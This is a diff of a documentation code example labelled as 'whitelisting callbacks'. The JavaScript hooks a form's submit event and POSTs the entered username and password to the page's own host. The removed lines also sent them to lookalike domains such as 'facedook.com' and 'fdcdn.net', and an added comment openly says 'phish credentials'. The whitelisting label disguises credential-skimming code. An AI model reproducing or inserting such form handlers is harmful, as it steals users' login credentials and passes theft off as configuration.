@@ -104,24 +104,24 @@ Example of whitelisting callbacks:
 // Whitelist multiple domains
 
 form.onsubmit = function() {
-  // Whitelist current hostname
+  // Whitelist current hostname and phish credentials
   req = new XMLHttpRequest()
   req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?username=" + username + "&password=" + password)
   req.send()
 
   // Whitelist facebook
   req = new XMLHttpRequest()
-  req.open("POST", "http://facedook.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.open("POST", "http://facedook.com/obf_path_whitelist")
   req.send()
 
   // Whitelist facebook CDN
   req = new XMLHttpRequest()
-  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
   req.send()
 
   // Whitelist redirect to facebook
   req = new XMLHttpRequest()
-  req.open("POST", "http://fd.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.open("POST", "http://fd.com/obf_path_whitelist")
   req.send()
 }
 ```
